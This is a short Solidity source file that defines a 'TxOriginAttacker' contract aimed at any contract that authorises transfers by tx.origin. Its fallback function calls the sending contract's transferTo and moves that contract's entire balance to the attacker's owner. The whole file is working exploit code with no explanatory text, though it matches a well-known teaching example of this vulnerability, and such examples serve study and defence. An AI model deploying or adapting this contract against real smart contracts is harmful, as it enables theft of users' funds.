pragma solidity ^0.5.8;
interface TxOriginVictim {  
   function transferTo(address to, uint amount) external;
}

contract TxOriginAttacker {
   address owner;
   constructor () public {  owner = msg.sender;}
   function getOwner() public returns (address) {  return owner;}
   function() external payable  {  
      TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
   }
}
